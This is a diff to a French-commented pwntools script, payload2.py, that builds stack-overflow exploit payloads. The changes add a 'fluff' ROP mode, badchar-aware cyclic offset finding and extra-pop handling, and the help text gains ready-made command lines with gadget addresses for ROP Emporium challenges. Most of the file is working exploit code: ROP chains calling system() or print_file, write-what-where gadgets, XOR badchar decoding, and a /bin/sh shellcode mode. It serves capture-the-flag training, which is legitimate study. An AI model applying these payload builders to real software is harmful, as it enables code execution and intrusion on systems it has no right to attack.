@@ -14,6 +14,7 @@ except ModuleNotFoundError as exc:
 
 
 DEFAULT_TARGET = "./binaries/bin/bof"
+DEFAULT_CYCLIC_ALPHABET = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 
 def parse_int(value: str) -> int:
@@ -247,12 +248,33 @@ def wait_for_crash(args, p, label: str) -> None:
         )
 
 
+def cyclic_alphabet(args) -> bytes:
+    if args.cyclic_alphabet is None:
+        alphabet = DEFAULT_CYCLIC_ALPHABET
+    else:
+        alphabet = args.cyclic_alphabet.encode()
+
+    badchars = parse_badchars(getattr(args, "badchars", None))
+    if badchars:
+        alphabet = bytes(byte for byte in alphabet if byte not in badchars)
+
+    if len(alphabet) < 2:
+        raise SystemExit("--cyclic-alphabet is too small after badchar filtering")
+    return alphabet
+
+
 def find_offset(args) -> int:
-    pattern = cyclic(args.pattern_len, n=args.cyclic_n)
+    alphabet = cyclic_alphabet(args)
+    pattern = cyclic(args.pattern_len, alphabet=alphabet, n=args.cyclic_n)
     if args.cyclic_n > context.bytes:
         raise SystemExit(f"--cyclic-n must be <= pointer size ({context.bytes}) for auto offset")
 
-    log.info("crashing target with cyclic pattern (%d bytes, n=%d)", len(pattern), args.cyclic_n)
+    log.info(
+        "crashing target with cyclic pattern (%d bytes, n=%d, alphabet=%d bytes)",
+        len(pattern),
+        args.cyclic_n,
+        len(alphabet),
+    )
     p = start_target(args, pattern)
     wait_for_crash(args, p, "cyclic probe")
 
@@ -520,6 +542,9 @@ def build_call_payload(args) -> bytes:
 
 
 def add_write_chunks(args, chain: list[int], data: bytes) -> None:
+    if args.write_extra_pops < 0:
+        raise SystemExit("--write-extra-pops must be >= 0")
+
     chunks = chunk_data(data, args.word_size, args.pad_byte)
     for index, chunk in enumerate(chunks):
         destination = args.where + (index * args.word_size)
@@ -530,6 +555,7 @@ def add_write_chunks(args, chain: list[int], data: bytes) -> None:
             chain.extend([destination, value])
         else:
             chain.extend([value, destination])
+        chain.extend([args.write_junk] * args.write_extra_pops)
         chain.append(args.write_gadget)
 
         log.info("write[%d] %#x <- %r", index, destination, chunk)
@@ -635,6 +661,58 @@ def build_ret2csu_payload(args) -> bytes:
     return payload_from_chain(args, chain)
 
 
+def find_byte_address_in_binary(byte: int) -> int:
+    elf = context.binary
+    for address in elf.search(bytes([byte])):
+        return address
+    raise SystemExit(f"could not find byte 0x{byte:02x} in target for fluff/xlatb")
+
+
+def add_fluff_byte_writer(args, chain: list[int], data: bytes) -> None:
+    current_al = args.initial_al & 0xFF
+    for index, byte in enumerate(data):
+        destination = args.where + index
+        source = find_byte_address_in_binary(byte)
+        wanted_rbx = source - current_al
+        rcx_value = wanted_rbx - args.bextr_add
+
+        chain.extend(
+            [
+                args.bextr,
+                args.bextr_control,
+                rcx_value,
+                args.xlat,
+                args.stosb,
+            ]
+        )
+        log.info(
+            "fluff[%d] %#x <- 0x%02x using source %#x, previous al=0x%02x",
+            index,
+            destination,
+            byte,
+            source,
+            current_al,
+        )
+        current_al = byte
+
+
+def build_fluff_payload(args) -> bytes:
+    data = data_from_args(args)
+
+    chain = []
+    if args.ret is not None:
+        chain.append(args.ret)
+
+    chain.extend([args.pop_rdi, args.where])
+    add_fluff_byte_writer(args, chain, data)
+
+    if args.call_ret is not None:
+        chain.append(args.call_ret)
+    chain.extend([args.pop_rdi, args.where, args.print_file])
+    log.success("print_file target @ %#x with rdi=%#x", args.print_file, args.where)
+    return payload_from_chain(args, chain)
+
+
 def parse_compose_part(part: str) -> bytes:
     kind, separator, value = part.partition(":")
     if not separator:
@@ -684,9 +762,43 @@ Modes:
   call       Appelle une ou plusieurs fonctions avec des arguments en registres.
   write      Ecrit une chaine en memoire avec des gadgets write-what-where.
   badchars   Ecrit une chaine encodee puis la decode en memoire.
+  fluff      Ecrit une chaine avec bextr/xlatb/stosb puis appelle print_file.
   pivot      Construit une petite payload de pivot de stack.
   ret2csu    Utilise les gadgets __libc_csu_init pour rdi/rsi/rdx.
   compose    Assemble des morceaux bruts dans l'ordre exact donne.
+
+Lecture rapide:
+  Le script construit toujours:
+    padding jusqu'au saved RIP
+    puis la chaine demandee par le mode
+
+  Une option --pop-xxx est l'adresse d'un gadget qui consomme la ou les valeurs
+  suivantes sur la pile. Exemple:
+    --pop-rdi 0x4007c3 --cmd-addr 0x601060 --system-addr 0x400560
+
+  devient:
+    0x4007c3      # pop rdi ; ret
+    0x601060      # valeur poppee dans rdi
+    0x400560      # prochaine adresse chargee dans RIP
+
+  Une option --ret ajoute un gadget ret avant la chaine pour l'alignement de
+  stack x86_64. C'est utile quand un appel system()/libc plante sans raison
+  apparente alors que les adresses sont bonnes.
+
+Options de creation courantes:
+  --pop-rdi, --pop-rsi, --pop-rdx:
+      gadgets qui mettent les arguments dans les registres d'appel Linux x86_64.
+  --arg-rdi, --arg-rsi, --arg-rdx:
+      valeurs qui seront consommees par les gadgets pop correspondants.
+  --write-order dst-value:
+      le gadget pop consomme d'abord l'adresse destination, puis la valeur.
+  --write-order value-dst:
+      le gadget pop consomme d'abord la valeur, puis l'adresse destination.
+  --xor-order key-addr / addr-key:
+      meme idee pour le gadget qui prepare le XOR de badchars.
+  --write-extra-pops N:
+      ajoute N valeurs junk apres destination/valeur si ton gadget pop contient
+      plus de registres que ceux utilises par le gadget d'ecriture.
 
 Aide detaillee par mode:
   python3 payload2.py shellcode -h
@@ -696,6 +808,7 @@ Aide detaillee par mode:
   python3 payload2.py call -h
   python3 payload2.py write -h
   python3 payload2.py badchars -h
+  python3 payload2.py fluff -h
   python3 payload2.py pivot -h
   python3 payload2.py ret2csu -h
   python3 payload2.py compose -h
@@ -714,7 +827,7 @@ Exemples:
   # shellcode local /bin/sh passe en argv
   python3 payload2.py --run --argv-safe --target ./binaries/bin/bof shellcode --builtin-sh
 
-  # callme: trois appels avec les arguments attendus par le challenge
+  # callme: trois appels avec les constantes attendues par le challenge
   python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/callme call \\
     --pop-rdi-rsi-rdx 0x40093c \\
     --arg-rdi 0xdeadbeefdeadbeef \\
@@ -738,9 +851,19 @@ Exemples:
     --data "flag.txt" --nul-terminate \\
     --badchars "0x78 0x67 0x61 0x2e" \\
     --xor-key 2 \\
-    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst \\
+    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst --write-extra-pops 2 \\
     --pop-xor 0x4006a0 --xor-gadget 0x400628 --xor-order key-addr \\
     --pop-rdi 0x4006a3 --call-addr 0x400510
+
+  # fluff: ecrire flag.txt avec xlatb/stosb puis print_file("flag.txt")
+  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/fluff fluff \\
+    --where 0x601028 \\
+    --data "flag.txt" --nul-terminate \\
+    --pop-rdi 0x4006a3 \\
+    --bextr 0x40062a \\
+    --xlat 0x400628 \\
+    --stosb 0x400639 \\
+    --print-file 0x400510
 
   # ret2csu: controler rdi/rsi/rdx avec les gadgets __libc_csu_init
   python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/ret2csu ret2csu \\
@@ -752,13 +875,12 @@ Exemples:
     --arg-rdx 0xd00df00dd00df00d \\
     --next-addr 0x4007b1
 
-  # compose: payload ultra precis, utile pour fluff ou chains sur mesure
-  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/fluff compose \\
+  # compose: payload ultra precis, ici equivalent manuel de split/system
+  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/split compose \\
     --part addr:0x400741 \\
-    --part addr:0x40062a \\
-    --part u64:0xdeadbeefdeadbeef \\
-    --part addr:0x400628 \\
-    --part addr:0x400620
+    --part addr:0x4007c3 \\
+    --part addr:0x601060 \\
+    --part addr:0x400560
 """
 
     parser = argparse.ArgumentParser(
@@ -769,52 +891,60 @@ Exemples:
         epilog=common_epilog,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"binaire cible (defaut: {DEFAULT_TARGET})")
+    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"binaire cible a analyser/executer (defaut: {DEFAULT_TARGET})")
     parser.add_argument(
         "--offset",
         type=parse_int,
-        help="offset jusqu'a l'adresse de retour; si absent, le script le cherche avec cyclic()",
+        help="nombre d'octets entre le debut de l'input controlee et le saved RIP; si absent, recherche avec cyclic()",
     )
     parser.add_argument(
         "--pattern-len",
         type=parse_int,
         default=200,
-        help="taille du motif cyclic utilise pour trouver l'offset (defaut: 200)",
+        help="taille du motif cyclic envoye pour provoquer le crash et retrouver l'offset (defaut: 200)",
     )
     parser.add_argument(
         "--cyclic-n",
         type=parse_int,
         default=8,
-        help="taille des sous-sequences cyclic; garder 8 en amd64 (defaut: 8)",
+        help="taille des sous-sequences uniques du cyclic; garder 8 en amd64 pour retrouver un RIP 64 bits",
+    )
+    parser.add_argument(
+        "--cyclic-alphabet",
+        help=(
+            "alphabet utilise pour le motif cyclic. Utile si la cible filtre des octets. "
+            "Dans le mode badchars, les octets de --badchars sont aussi retires automatiquement."
+        ),
     )
     parser.add_argument(
         "--ret-size",
         type=parse_int,
-        help="nombre d'octets de l'adresse a ecrire (defaut: 8 en stdin, 6 en argv)",
+        help="taille de l'adresse de retour pour jump/shellcode: 8 en stdin, souvent 6 en argv pour eviter les NUL",
     )
-    parser.add_argument("--padding-byte", type=parse_byte, default=b"A", help="octet de padding, ex: 0x41 pour 'A'")
-    parser.add_argument("--nop-byte", type=parse_byte, default=b"\x90", help="octet NOP pour le sled shellcode (defaut: 0x90)")
-    parser.add_argument("--crash-byte", type=parse_byte, default=b"A", help="octet utilise pour provoquer le crash de probe")
-    parser.add_argument("--output", "-o", default="payload.bin", help="fichier ou ecrire le payload final")
-    parser.add_argument("--core-dir", default="core", help="dossier ou deplacer les corefiles apres lecture")
+    parser.add_argument("--padding-byte", type=parse_byte, default=b"A", help="octet utilise pour remplir jusqu'au saved RIP, ex: 0x41 pour 'A'")
+    parser.add_argument("--nop-byte", type=parse_byte, default=b"\x90", help="octet NOP pour le sled du mode shellcode (defaut: 0x90)")
+    parser.add_argument("--crash-byte", type=parse_byte, default=b"A", help="octet utilise pour ecraser temporairement RIP pendant les probes")
+    parser.add_argument("--output", "-o", default="payload.bin", help="fichier ou ecrire le payload final genere")
+    parser.add_argument("--core-dir", default="core", help="dossier cree si besoin ou les corefiles sont deplaces apres lecture")
     parser.add_argument(
         "--cwd",
         default="target-dir",
-        help="'target-dir' lance depuis le dossier du binaire, 'current' depuis le dossier courant, ou chemin custom",
+        help="'target-dir' lance depuis le dossier du binaire, 'current' depuis le dossier courant, ou un chemin custom",
     )
-    parser.add_argument("--input", choices=("argv", "stdin"), default="argv", help="envoie le payload en argument argv ou sur stdin")
-    parser.add_argument("--stdin-newline", action="store_true", help="ajoute un '\\n' apres le payload envoye sur stdin")
-    parser.add_argument("--crash-timeout", type=float, default=5.0, help="secondes max d'attente pour les crashs de probe")
-    parser.add_argument("--aslr", action="store_true", help="laisse l'ASLR activee; par defaut pwntools la desactive")
-    parser.add_argument("--empty-env", action="store_true", help="lance la cible avec un environnement vide")
-    parser.add_argument("--argv-safe", action="store_true", help="refuse le payload final s'il contient des octets NUL")
-    parser.add_argument("--run", action="store_true", help="execute la cible avec le payload final apres generation")
+    parser.add_argument("--input", choices=("argv", "stdin"), default="argv", help="canal d'envoi: argv pour argument de programme, stdin pour read()/gets()/fgets()")
+    parser.add_argument("--stdin-newline", action="store_true", help="ajoute un '\\n' apres le payload envoye sur stdin, utile si la cible attend une ligne")
+    parser.add_argument("--crash-timeout", type=float, default=5.0, help="secondes max d'attente pendant les probes cyclic/shellcode avant d'abandonner")
+    parser.add_argument("--aslr", action="store_true", help="laisse l'ASLR activee; par defaut pwntools lance la cible avec ASLR desactivee")
+    parser.add_argument("--empty-env", action="store_true", help="lance la cible avec un environnement vide pour stabiliser la pile")
+    parser.add_argument("--argv-safe", action="store_true", help="verifie que le payload final ne contient aucun octet NUL, obligatoire pour argv")
+    parser.add_argument("--run", action="store_true", help="execute la cible avec le payload final apres l'avoir ecrit dans --output")
     parser.add_argument("--no-hexdump", action="store_true", help="n'affiche pas l'hexdump du payload final")
-    parser.add_argument("--checksec", action="store_true", help="affiche les protections du binaire via pwntools")
+    parser.add_argument("--checksec", action="store_true", help="affiche les protections du binaire via pwntools; peut etre utilise seul")
 
     subparsers = parser.add_subparsers(
         dest="mode",
-        metavar="{shellcode,jump,chain,system,call,write,badchars,pivot,ret2csu,compose}",
+        required=False,
+        metavar="{shellcode,jump,chain,system,call,write,badchars,fluff,pivot,ret2csu,compose}",
     )
 
     shellcode_parser = subparsers.add_parser(
@@ -826,25 +956,40 @@ Exemples:
   python3 payload2.py --run --argv-safe shellcode --builtin-sh
   python3 payload2.py --run --argv-safe shellcode --shellcode-file shell.asm --shellcode-format asm
   python3 payload2.py shellcode --shellcode-file sc.bin --shellcode-format raw
+
+Payload genere:
+  NOP sled
+  shellcode
+  padding apres shellcode
+  adresse de retour vers le shellcode
+
+Formats:
+  raw   octets bruts deja executables.
+  hex   texte hexadecimal, avec ou sans \\x.
+  asm   assembleur transforme en shellcode par pwntools.
+  text  ligne simple comme /bin/sh, convertie en vrai shellcode.
+
+Si --ret-addr est absent, le script fait une probe, lit le corefile, cherche le
+shellcode sur la stack, puis utilise cette adresse comme retour.
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     shellcode_source = shellcode_parser.add_mutually_exclusive_group(required=True)
-    shellcode_source.add_argument("--shellcode-file", help="fichier contenant du shellcode raw, hex, asm ou texte .sh")
-    shellcode_source.add_argument("--builtin-sh", action="store_true", help="utilise le shellcode pwntools /bin/sh local")
+    shellcode_source.add_argument("--shellcode-file", help="fichier contenant du shellcode raw, hex, asm, ou une ligne texte simple comme /bin/sh")
+    shellcode_source.add_argument("--builtin-sh", action="store_true", help="genere avec pwntools un shellcode local execve('/bin/sh')")
     shellcode_parser.add_argument(
         "--shellcode-format",
         choices=("auto", "raw", "hex", "asm", "text"),
         default="auto",
-        help="format du fichier: auto, raw, hex, asm, text",
+        help="format du fichier shellcode; auto choisit selon l'extension",
     )
     shellcode_parser.add_argument(
         "--post-shell-padding",
         type=parse_int,
         default=56,
-        help="padding place apres le shellcode avant l'adresse de retour (defaut: 56)",
+        help="nombre d'octets de padding places apres le shellcode avant le saved RIP",
     )
-    shellcode_parser.add_argument("--ret-addr", type=parse_int, help="adresse de retour manuelle vers le shellcode")
+    shellcode_parser.add_argument("--ret-addr", type=parse_int, help="adresse de retour manuelle vers le shellcode; sinon le script tente de la retrouver dans le corefile")
     shellcode_parser.set_defaults(builder=build_shellcode_payload)
 
     jump_parser = subparsers.add_parser(
@@ -855,10 +1000,19 @@ Exemples:
 Exemples:
   python3 payload2.py --run --input stdin --target ./ret2win jump --addr 0x400757
   python3 payload2.py --offset 40 jump --addr 0x400757
+
+Payload genere:
+  padding
+  addr
+
+Utilisation:
+  Sert quand l'adresse cible est directement du code executable: fonction win,
+  ret2win+1, gadget, ou debut d'une autre chaine. Ne pas l'utiliser pour une
+  adresse de string comme "/bin/cat flag.txt": dans ce cas il faut system/call.
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    jump_parser.add_argument("--addr", type=parse_int, required=True, help="adresse vers laquelle rediriger RIP")
+    jump_parser.add_argument("--addr", type=parse_int, required=True, help="adresse de code chargee dans RIP au retour de la fonction vulnerable")
     jump_parser.set_defaults(builder=build_jump_payload)
 
     chain_parser = subparsers.add_parser(
@@ -872,6 +1026,16 @@ Exemple:
     --addr 0x4007c3 \\
     --addr 0x601060 \\
     --addr 0x400560
+
+Payload genere:
+  padding
+  addr_1
+  addr_2
+  addr_3
+  ...
+
+Ici le script ne comprend pas la semantique des adresses. Il packe simplement
+chaque --addr en 64 bits little-endian, dans l'ordre donne.
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
@@ -901,13 +1065,24 @@ Trouver les adresses:
   ROPgadget --binary ./split | grep "pop rdi"
   rabin2 -z ./split | grep "cat flag"
   objdump -d ./split | grep system@plt
+
+Pile generee apres le padding:
+  ret optionnel
+  pop_rdi          # gadget pop rdi ; ret
+  cmd_addr         # adresse de la commande, placee dans rdi
+  system_addr      # system@plt ou system
+
+Important:
+  --cmd-addr n'est pas une adresse de code. C'est l'adresse d'une chaine comme
+  "/bin/cat flag.txt". On ne saute pas dessus; on la met dans rdi, puis on
+  saute vers system().
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    system_parser.add_argument("--pop-rdi", type=parse_int, required=True, help="adresse du gadget pop rdi ; ret")
-    system_parser.add_argument("--cmd-addr", type=parse_int, required=True, help="adresse de la chaine commande, ex: /bin/cat flag.txt")
-    system_parser.add_argument("--system-addr", type=parse_int, required=True, help="adresse de system@plt ou system")
-    system_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel pour realigner la stack")
+    system_parser.add_argument("--pop-rdi", type=parse_int, required=True, help="adresse du gadget pop rdi ; ret; il consomme --cmd-addr et le place dans rdi")
+    system_parser.add_argument("--cmd-addr", type=parse_int, required=True, help="adresse memoire de la chaine commande, ex: adresse de '/bin/cat flag.txt'")
+    system_parser.add_argument("--system-addr", type=parse_int, required=True, help="adresse de system@plt dans le binaire, ou adresse libc de system si tu fais du ret2libc")
+    system_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel place avant pop-rdi pour realigner la stack")
     system_parser.set_defaults(builder=build_system_payload)
 
     call_parser = subparsers.add_parser(
@@ -931,24 +1106,50 @@ Exemple avec gadgets separes:
     --pop-rdi 0x401123 --arg-rdi 0xdeadbeef \\
     --pop-rsi 0x401125 --arg-rsi 2 \\
     --func 0x401050
+
+Pile generee avec --pop-rdi-rsi-rdx:
+  pop_rdi_rsi_rdx
+  arg_rdi
+  arg_rsi
+  arg_rdx
+  func_1
+  pop_rdi_rsi_rdx
+  arg_rdi
+  arg_rsi
+  arg_rdx
+  func_2
+
+Pile generee avec gadgets separes:
+  pop_rdi
+  arg_rdi
+  pop_rsi
+  arg_rsi
+  pop_rdx
+  arg_rdx
+  func
+
+Convention Linux x86_64:
+  rdi = 1er argument, rsi = 2e, rdx = 3e, rcx = 4e, r8 = 5e, r9 = 6e.
+  Les valeurs --arg-* ne sont pas choisies par le script: elles viennent de
+  l'enonce, du disassembleur, ou de ce que la fonction attend.
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    call_parser.add_argument("--func", dest="funcs", type=parse_int, action="append", required=True, help="fonction a appeler; repeter pour plusieurs appels")
-    call_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
-    call_parser.add_argument("--pop-rdi-rsi-rdx", type=parse_int, help="gadget pop rdi ; pop rsi ; pop rdx ; ret")
-    call_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret")
-    call_parser.add_argument("--pop-rsi", type=parse_int, help="gadget pop rsi ; ret")
-    call_parser.add_argument("--pop-rdx", type=parse_int, help="gadget pop rdx ; ret")
-    call_parser.add_argument("--pop-rcx", type=parse_int, help="gadget pop rcx ; ret")
-    call_parser.add_argument("--pop-r8", type=parse_int, help="gadget pop r8 ; ret")
-    call_parser.add_argument("--pop-r9", type=parse_int, help="gadget pop r9 ; ret")
-    call_parser.add_argument("--arg-rdi", type=parse_int, help="valeur du 1er argument")
-    call_parser.add_argument("--arg-rsi", type=parse_int, help="valeur du 2e argument")
-    call_parser.add_argument("--arg-rdx", type=parse_int, help="valeur du 3e argument")
-    call_parser.add_argument("--arg-rcx", type=parse_int, help="valeur du 4e argument")
-    call_parser.add_argument("--arg-r8", type=parse_int, help="valeur du 5e argument")
-    call_parser.add_argument("--arg-r9", type=parse_int, help="valeur du 6e argument")
+    call_parser.add_argument("--func", dest="funcs", type=parse_int, action="append", required=True, help="adresse de fonction a appeler; repeter --func pour enchainer plusieurs appels")
+    call_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack avant les appels")
+    call_parser.add_argument("--pop-rdi-rsi-rdx", type=parse_int, help="gadget multi-pop: pop rdi ; pop rsi ; pop rdx ; ret")
+    call_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret, utilise si tu fournis --arg-rdi sans multi-pop")
+    call_parser.add_argument("--pop-rsi", type=parse_int, help="gadget pop rsi ; ret, utilise si tu fournis --arg-rsi sans multi-pop")
+    call_parser.add_argument("--pop-rdx", type=parse_int, help="gadget pop rdx ; ret, utilise si tu fournis --arg-rdx sans multi-pop")
+    call_parser.add_argument("--pop-rcx", type=parse_int, help="gadget pop rcx ; ret pour un 4e argument")
+    call_parser.add_argument("--pop-r8", type=parse_int, help="gadget pop r8 ; ret pour un 5e argument")
+    call_parser.add_argument("--pop-r9", type=parse_int, help="gadget pop r9 ; ret pour un 6e argument")
+    call_parser.add_argument("--arg-rdi", type=parse_int, help="valeur du 1er argument, mise dans rdi avant chaque --func")
+    call_parser.add_argument("--arg-rsi", type=parse_int, help="valeur du 2e argument, mise dans rsi avant chaque --func")
+    call_parser.add_argument("--arg-rdx", type=parse_int, help="valeur du 3e argument, mise dans rdx avant chaque --func")
+    call_parser.add_argument("--arg-rcx", type=parse_int, help="valeur du 4e argument, mise dans rcx avant chaque --func")
+    call_parser.add_argument("--arg-r8", type=parse_int, help="valeur du 5e argument, mise dans r8 avant chaque --func")
+    call_parser.add_argument("--arg-r9", type=parse_int, help="valeur du 6e argument, mise dans r9 avant chaque --func")
     call_parser.set_defaults(builder=build_call_payload)
 
     write_parser = subparsers.add_parser(
@@ -968,25 +1169,50 @@ Exemple write4:
     --write-order dst-value \\
     --pop-rdi 0x400693 \\
     --call-addr 0x400510
+
+Pile generee par chunk:
+  pop_write
+  destination/value selon --write-order
+  eventuelles valeurs junk de --write-extra-pops
+  write_gadget
+
+Choisir --write-order:
+  Si ton gadget est:
+    pop r14 ; pop r15 ; ret
+    mov qword ptr [r14], r15 ; ret
+  alors --write-order dst-value.
+
+  Si ton gadget est:
+    pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+    mov qword ptr [r13], r12 ; ret
+  alors --write-order value-dst et --write-extra-pops 2.
+
+Appel final optionnel:
+  Avec --pop-rdi et --call-addr, le script ajoute:
+    pop_rdi
+    call_arg ou where
+    call_addr
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    write_parser.add_argument("--where", type=parse_int, required=True, help="adresse memoire ou ecrire les donnees")
-    write_parser.add_argument("--data", help="donnees ASCII a ecrire")
-    write_parser.add_argument("--data-hex", help="donnees hex a ecrire, ex: 666c61672e747874")
-    write_parser.add_argument("--data-file", help="fichier dont le contenu doit etre ecrit")
-    write_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent")
-    write_parser.add_argument("--badchars", help="octets interdits a refuser dans la donnee, ex: '0x00 0x0a'")
-    write_parser.add_argument("--word-size", type=parse_int, default=8, help="taille d'un mot ecrit par gadget (defaut: 8)")
-    write_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet de padding du dernier mot")
-    write_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut")
-    write_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop pour preparer destination et valeur")
-    write_parser.add_argument("--write-gadget", type=parse_int, required=True, help="gadget qui ecrit la valeur en memoire")
-    write_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des pops du gadget d'ecriture")
-    write_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour appeler une fonction ensuite")
-    write_parser.add_argument("--call-addr", type=parse_int, help="fonction a appeler apres l'ecriture, ex: print_file@plt")
+    write_parser.add_argument("--where", type=parse_int, required=True, help="adresse writable ou la donnee sera ecrite, ex: .data ou .bss")
+    write_parser.add_argument("--data", help="donnees ASCII/UTF-8 a ecrire, ex: flag.txt")
+    write_parser.add_argument("--data-hex", help="donnees hex a ecrire, ex: 666c61672e747874 pour flag.txt")
+    write_parser.add_argument("--data-file", help="fichier dont le contenu brut doit etre ecrit")
+    write_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent, utile pour une string C")
+    write_parser.add_argument("--badchars", help="octets interdits a refuser dans la donnee claire, ex: '0x00 0x0a'")
+    write_parser.add_argument("--word-size", type=parse_int, default=8, help="nombre d'octets ecrits par write-gadget, souvent 8 en amd64")
+    write_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet utilise pour completer le dernier chunk jusqu'a --word-size")
+    write_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
+    write_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop qui charge les registres utilises par --write-gadget")
+    write_parser.add_argument("--write-gadget", type=parse_int, required=True, help="gadget mov/stos qui ecrit la valeur en memoire")
+    write_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des deux premieres valeurs consommees par --pop-write")
+    write_parser.add_argument("--write-extra-pops", type=parse_int, default=0, help="nombre de registres supplementaires poppes par --pop-write apres destination/valeur")
+    write_parser.add_argument("--write-junk", type=parse_int, default=0x4141414141414141, help="valeur junk utilisee pour remplir les pops supplementaires")
+    write_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour preparer l'argument de l'appel final")
+    write_parser.add_argument("--call-addr", type=parse_int, help="fonction appelee apres l'ecriture, ex: print_file@plt")
     write_parser.add_argument("--call-arg", type=parse_int, help="argument rdi de l'appel final; defaut: --where")
-    write_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel avant l'appel final")
+    write_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel juste avant l'appel final")
     write_parser.set_defaults(builder=build_write_payload)
 
     badchars_parser = subparsers.add_parser(
@@ -1003,33 +1229,112 @@ Exemple badchars:
     --data "flag.txt" --nul-terminate \\
     --badchars "0x78 0x67 0x61 0x2e" \\
     --xor-key 2 \\
-    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst \\
+    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst --write-extra-pops 2 \\
     --pop-xor 0x4006a0 --xor-gadget 0x400628 --xor-order key-addr \\
     --pop-rdi 0x4006a3 --call-addr 0x400510
+
+Etapes generees:
+  1. XOR de chaque octet de --data avec --xor-key.
+  2. Ecriture de la donnee encodee avec pop-write/write-gadget.
+  3. Pour chaque octet, appel du gadget XOR pour le decoder en memoire.
+  4. Optionnellement, pop rdi ; ret puis call-addr.
+
+Ordres:
+  --write-order concerne le gadget qui prepare l'ecriture memoire.
+  --xor-order concerne le gadget qui prepare la cle XOR et l'adresse a decoder.
+
+Exemple ROP Emporium badchars x64:
+  pop-write = pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+  write-gadget = mov qword ptr [r13], r12 ; ret
+  donc --write-order value-dst --write-extra-pops 2.
+
+  pop-xor = pop r14 ; pop r15 ; ret
+  xor-gadget = xor byte ptr [r15], r14b ; ret
+  donc --xor-order key-addr.
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    badchars_parser.add_argument("--where", type=parse_int, required=True, help="adresse memoire ou ecrire les donnees encodees")
-    badchars_parser.add_argument("--data", help="donnees ASCII a encoder/ecrire")
-    badchars_parser.add_argument("--data-hex", help="donnees hex a encoder/ecrire")
-    badchars_parser.add_argument("--data-file", help="fichier dont le contenu doit etre encode/ecrit")
-    badchars_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent")
-    badchars_parser.add_argument("--badchars", required=True, help="octets interdits, ex: '0x78 0x67 0x61 0x2e'")
-    badchars_parser.add_argument("--xor-key", type=parse_int, required=True, help="cle XOR 1 octet utilisee pour encoder/decoder")
-    badchars_parser.add_argument("--word-size", type=parse_int, default=8, help="taille d'un mot ecrit par gadget (defaut: 8)")
-    badchars_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet de padding du dernier mot")
-    badchars_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut")
-    badchars_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop pour preparer destination et valeur")
+    badchars_parser.add_argument("--where", type=parse_int, required=True, help="adresse writable ou ecrire les donnees encodees")
+    badchars_parser.add_argument("--data", help="donnees ASCII/UTF-8 a encoder puis ecrire")
+    badchars_parser.add_argument("--data-hex", help="donnees hex a encoder puis ecrire")
+    badchars_parser.add_argument("--data-file", help="fichier dont le contenu doit etre encode puis ecrit")
+    badchars_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent, puis encode aussi cet octet")
+    badchars_parser.add_argument("--badchars", required=True, help="octets interdits dans le payload, ex: '0x78 0x67 0x61 0x2e'")
+    badchars_parser.add_argument("--xor-key", type=parse_int, required=True, help="cle XOR sur 1 octet; doit produire des octets encodes sans badchars")
+    badchars_parser.add_argument("--word-size", type=parse_int, default=8, help="nombre d'octets ecrits par write-gadget, souvent 8 en amd64")
+    badchars_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet utilise pour completer le dernier chunk encode")
+    badchars_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
+    badchars_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop qui charge les registres utilises par --write-gadget")
     badchars_parser.add_argument("--write-gadget", type=parse_int, required=True, help="gadget qui ecrit la valeur encodee en memoire")
-    badchars_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des pops du gadget d'ecriture")
-    badchars_parser.add_argument("--pop-xor", type=parse_int, required=True, help="gadget pop pour preparer la cle XOR et l'adresse")
